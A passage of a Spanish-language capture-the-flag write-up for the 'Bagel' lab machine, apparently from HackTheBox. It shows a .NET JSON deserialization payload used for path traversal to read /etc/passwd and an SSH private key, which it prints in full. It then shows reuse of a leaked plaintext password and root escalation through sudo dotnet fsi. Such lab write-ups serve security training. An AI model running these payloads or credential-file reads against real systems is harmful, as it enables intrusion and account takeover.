    "ReadFile": "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\ntss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin\nsystemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin\npolkitd:x:998:997:User for polkitd:/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nabrt:x:173:173::/etc/abrt:/sbin/nologin\nsetroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin\ncockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin\ncockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\nchrony:x:994:992::/var/lib/chrony:/sbin/nologin\ndnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nsystemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin\nsystemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin\ndeveloper:x:1000:1000::/home/developer:/bin/bash\nphil:x:1001:1001::/home/phil:/bin/bash\n_laurel:x:987:987::/var/log/laurel:/bin/false",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
```

Ahora bien, ya teníamos un LFI anteriormente, pero quizás el servidor de WebSocket no lo está ejecutando `developer` si no `phil`, así que vamos a intentar leer su clave privada.

Modificamos el payload.
```console
{
    "RemoveOrder": {
        "$type": "bagel_server.File, bagel",
        "ReadFile": "../../../../../../../../home/phil/.ssh/id_rsa"
    }
}
```

Y podemos leer su clave privada, así que ya solo falta darla formato, permisos e iniciar sesión por SSH como `phil`
```python3
python3 exploit.py
[*] Enviando payload malicioso...
[*] Respuesta del servidor: {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "6:12:40",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
```

Para darla formato simplemente hay que reemplazar la secuencia `\n` por saltos de línea reales, para ello podemos utilizar `sed` (por ejemplo).
```console
echo "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n..." | sed 's/\\n/\n/g' > id_rsa.phil
```

Podemos comprobar que ya tenemos la clave formateada.
![Write-up Image](images/Screenshot_7.png)

Ahora simplemente le damos los permisos necesarios.
```console
chmod 600 id_rsa.phil
```

Y ya podemos iniciar sesión como `phil`
```console
ssh phil@bagel.htb -i id_rsa.phil
Last login: Tue Feb 14 11:47:33 2023 from 10.10.14.19
[phil@bagel ~]$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Podemos leer la flag de usuario.
```console
[phil@bagel ~]$ cat user.txt
d71c8c414532a4...
```

# User Pivoting
Al parecer poco puedo hacer como `phil`, pero recordemos que antes hemos visto una contraseña de acceso a base de datos, cuyo usuario se llamaba `dev` y recordemos que existe un usuario a nivel de sistema llamado `developer`, así que podemos utilizar el combo:
```console
developer:k8wdAYYKyhnjg3K
```

Y así migrar de usuario.
```console
[phil@bagel ~]$ su developer
Password:
[developer@bagel phil]$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

# Privilege Escalation
## Abusing `dotnet` interactive `F#` console
Vemos que `developer` puede ejecutar como `root` y sin introducir contraseña el binario `dotnet`, esto es una cagada enorme ya que podríamos crearnos un aplicación maliciosa .NET para ejecutar un comando a nivel de sistema.
```console
[developer@bagel phil]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

O simplemente podemos [revisar GTFOBins](https://gtfobins.github.io/gtfobins/dotnet/#sudo) y vemos que hay un método para escalar privilegios.
```
dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
```

Se utiliza el comando `fsi`, que es para iniciar una consola interactiva de `F#`.

```console
[developer@bagel phil]$ sudo dotnet fsi

Microsoft (R) F# Interactive version 12.0.0.0 for F# 6.0
Copyright (c) Microsoft Corporation. All Rights Reserved.

For help type #help;;

>
```

Ahora hacemos uso del método `System.Diagnostics.Process.Start` para iniciar una bash y como estamos ejecutando `dotnet` como `root`, iniciaremos una consola como este usuario.
```console
> System.Diagnostics.Process.Start("/bin/bash").WaitForExit();;
[root@bagel phil]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Podemos leer la flag de `root`
```console
[root@bagel ~]# cat root.txt
4e820d511b8f6b06...
```

¡Y ya estaría!

Happy Hacking! 🚀